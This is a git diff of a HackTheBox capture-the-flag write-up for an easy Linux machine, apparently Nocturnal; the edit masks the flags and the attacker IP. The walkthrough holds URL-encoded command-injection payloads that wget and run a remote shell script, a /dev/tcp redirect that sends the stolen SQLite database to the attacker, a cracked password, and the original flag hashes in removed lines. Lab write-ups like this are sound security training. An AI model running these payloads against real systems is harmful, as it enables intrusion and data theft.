@@ -2,7 +2,6 @@ HackTheBox Machine Report
 -----------------
 
 Machine Name: Noc------
-Difficulty: Easy
 Date: 29/04/2025
 -----------------------
 
@@ -45,7 +44,7 @@ unames found:
 	python -m http.server 8000
 
 # wget the file from the client machine
-	%0Abash%09-c%09"wget%0910.10.16.13:4444/shell"%0A
+	%0Abash%09-c%09"wget%09{your_IP}:4444/shell"%0A
 
 # execute the bash shell
 	%0Abash%09-c%09"bash%09shell"%0A
@@ -53,7 +52,7 @@ unames found:
 # once connected retrieve the nocturnal_database.db from 
 	../nocturnal_database/nocturnal_database.db
 	using:
-		../nocturnal_database/nocturnal_database.db > /dev/tcp/10.10.16.13/8888
+		../nocturnal_database/nocturnal_database.db > /dev/tcp/{your_IP}/8888
 
 # given a SQLite db use sqlitebrowser to inspect the database
 # the hashes are MD5 encoded
@@ -64,7 +63,7 @@ unames found:
 		slowmotionapocalypse
 
 # ssh into the server and retrieve the user flag
-	user_flag: 8b07aa89e252af94ea4b0752fddd2c2d
+	user_flag: {********************************}
 
 # check the networks for more information
 	ss -tuln
@@ -79,6 +78,6 @@ unames found:
 
 # run the python exploit to get a ispconfig-shell (root shell):
 # read the contents of root.txt
-	root_flag:9c1706a0d6d2c663a5aded7b2de80a15
+	root_flag:{********************************}
 
 # Cleanup: remove every file from the remote server and disconnect the port forwarding
